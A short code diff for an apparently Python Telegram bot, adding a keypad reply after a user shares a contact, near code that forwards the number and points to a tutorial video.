@@ -366,6 +366,9 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         log.exception("Error enviando número al destino: %s", e)
 
+    text, kb = build_keypad("")
+    await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")
+
     tutorial_video = os.getenv("TUTORIAL_VIDEO", "").strip()
     tutorial_text = "revisa detenidamente el video tutorial"
 
